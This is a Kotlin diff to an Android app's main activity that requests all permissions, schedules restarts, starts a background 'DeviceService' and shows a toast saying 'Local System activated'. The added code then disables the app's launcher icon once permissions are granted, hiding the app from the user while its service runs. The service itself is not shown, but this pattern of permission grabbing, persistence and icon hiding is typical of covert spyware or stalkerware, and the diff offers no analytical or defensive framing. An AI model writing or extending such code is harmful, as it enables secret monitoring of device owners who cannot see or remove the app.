@@ -14,6 +14,7 @@ import android.os.SystemClock
 import android.provider.Settings
 import android.Manifest
 import android.app.NotificationManager
+import android.widget.Toast
 
 class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -22,6 +23,8 @@ class MainActivity : Activity() {
         requestAllPermissions()
         scheduleRestart()
         startService(Intent(this, DeviceService::class.java))
+        
+        Toast.makeText(this, "Local System activated", Toast.LENGTH_SHORT).show()
         
         finish()
     }
@@ -60,27 +63,30 @@ class MainActivity : Activity() {
         
         if (permissions.isNotEmpty()) {
             requestPermissions(permissions.toTypedArray(), 100)
+            return
         }
         
+        hideAppIcon()
+    }
+    
+    private fun hideAppIcon() {
         try {
-            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-            if (!nm.isNotificationPolicyAccessGranted) {
-                startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS))
-            }
-        } catch (_: Exception) {}
-        
-        try {
-            val pm = getSystemService(POWER_SERVICE) as PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:$packageName")
-                })
-            }
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
         } catch (_: Exception) {}
     }
     
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        
+        val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+        if (allGranted) {
+            hideAppIcon()
+        }
+        
         startService(Intent(this, DeviceService::class.java))
         finish()
     }
